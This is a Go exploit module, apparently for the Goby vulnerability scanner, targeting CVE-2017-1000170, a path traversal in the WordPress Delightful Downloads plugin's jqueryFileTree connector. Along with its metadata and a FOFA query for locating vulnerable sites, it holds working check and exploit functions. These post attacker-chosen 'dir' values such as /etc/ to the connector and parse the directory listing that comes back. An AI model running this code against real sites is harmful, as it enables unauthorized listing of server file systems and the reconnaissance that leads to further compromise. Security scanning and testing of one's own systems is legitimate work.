package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "WordPress Delightful Downloads LFI (CVE-2017-1000170)",
    "Description": "WordPress Delightful Downloads Jquery File Tree plugin versions 1.6.6 and below path traversal exploit.",
    "Impact": "WordPress Delightful Downloads LFI (CVE-2017-1000170)",
    "Recommendation": "<p>1. Restricted directory.</p><p>2. Whitelist defines the path that can be read.</p><p>3. upgrade to the latest version.</p>",
    "Product": "wordpress-delightful-downloads",
    "VulType": [
        "Directory Traversal"
    ],
    "Tags": [
        "Directory Traversal"
    ],
    "Translation": {
        "CN": {
            "Name": "WordPress delightful-downloads 插件 jqueryFileTree 文件 目录遍历漏洞 (CVE-2017-1000170)",
            "Description": "<p>WordPress 是一款开源软件，可用于创建精美的网站、博客或应用程序。</p><p>WordPress delightful-downloads 插件 jqueryFileTree 文件存在目录遍历漏洞，攻击者可能通过浏览目录结构，访问到某些隐秘文件包括配置文件、日志、源代码等，配合其它漏洞的综合利用，攻击者可以轻易的获取更高的权限。</p>",
            "Impact": "<p>WordPress delightful-downloads 插件 jqueryFileTree 文件存在目录遍历漏洞，攻击者可能通过浏览目录结构，访问到某些隐秘文件包括配置文件、日志、源代码等，配合其它漏洞的综合利用，攻击者可以轻易的获取更高的权限。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://github.com/A5hleyRich/delightful-downloads\">https://github.com/A5hleyRich/delightful-downloads</a></p><p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。<br>2、如非必要，禁止公网访问该系统。</p>",
            "Product": "wordpress",
            "VulType": [
                "目录遍历"
            ],
            "Tags": [
                "目录遍历"
            ]
        },
        "EN": {
            "Name": "WordPress Delightful Downloads LFI (CVE-2017-1000170)",
            "Description": "WordPress Delightful Downloads Jquery File Tree plugin versions 1.6.6 and below path traversal exploit.",
            "Impact": "WordPress Delightful Downloads LFI (CVE-2017-1000170)",
            "Recommendation": "<p>1. Restricted directory.</p><p>2. Whitelist defines the path that can be read.</p><p>3. upgrade to the latest version.</p>",
            "Product": "wordpress-delightful-downloads",
            "VulType": [
                "Directory Traversal"
            ],
            "Tags": [
                "Directory Traversal"
            ]
        }
    },
    "FofaQuery": "body=\"wp-content/plugins/delightful-downloads\"",
    "GobyQuery": "body=\"wp-content/plugins/delightful-downloads\"",
    "Author": "sharecast.net@gmail.com",
    "Homepage": "https://github.com/A5hleyRich/delightful-downloads",
    "DisclosureDate": "2021-06-14",
    "References": [
        "https://packetstormsecurity.com/files/161900/WordPress-Delightful-Downloads-Jquery-File-Tree-1.6.6-Path-Traversal.html"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "5.6",
    "CVEIDs": [
        "CVE-2017-1000170"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-201711-708"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "file",
            "type": "input",
            "value": "/",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10241"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/wp-content/plugins/delightful-downloads/assets/vendor/jqueryFileTree/connectors/jqueryFileTree.php"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Data = "dir=/etc/"
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, `class="jqueryFileTree"`) && strings.Contains(resp.Utf8Html, "/etc/passwd") {
					return true
				} else {
					cfg.Data = "dir=c:/windows/"
					return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "directory collapsed") && strings.Contains(resp.Utf8Html, "System32")
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri := "/wp-content/plugins/delightful-downloads/assets/vendor/jqueryFileTree/connectors/jqueryFileTree.php"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Data = fmt.Sprintf("dir=%s", ss.Params["file"].(string))
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					expResult.Success = true
					if strings.Contains(resp.Utf8Html, `class="jqueryFileTree"`) {
						ldir := regexp.MustCompile(`<a href="#" rel="([^"]+)"`).FindAllStringSubmatch(resp.Utf8Html, -1)
						var files string
						for i := 0; i < len(ldir); i++ {
							files += ldir[i][1]
							files += "\r\n"
						}
						expResult.Output = files
					} else {
						expResult.Output = resp.Utf8Html
					}
				}
			}
			return expResult
		},
	))
}
